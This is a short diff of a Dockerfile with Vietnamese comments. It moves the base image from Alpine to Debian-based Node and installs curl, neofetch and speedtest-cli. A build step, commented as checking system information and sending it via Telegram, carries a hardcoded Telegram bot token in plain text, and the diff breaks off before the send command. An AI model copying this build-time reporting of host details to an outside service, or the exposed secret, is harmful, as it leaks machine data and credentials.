@@ -1,18 +1,11 @@
-# Sử dụng image Node.js Alpine nhỏ gọn
-FROM node:lts-alpine
+# Sử dụng image Node.js từ Ubuntu
+FROM node:lts
 
 # Cài đặt các công cụ cần thiết
-RUN apk add --no-cache \
+RUN apt-get update && apt-get install -y \
     curl \
-    speedtest-cli \
-    git \
-    bash
-
-# Cài đặt neofetch từ source
-RUN git clone https://github.com/dylanaraps/neofetch.git /tmp/neofetch && \
-    cd /tmp/neofetch && \
-    make install && \
-    rm -rf /tmp/neofetch
+    neofetch \
+    speedtest-cli
 
 # Kiểm tra thông tin hệ thống và gửi qua Telegram
 RUN BOT_TOKEN="7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw" && \
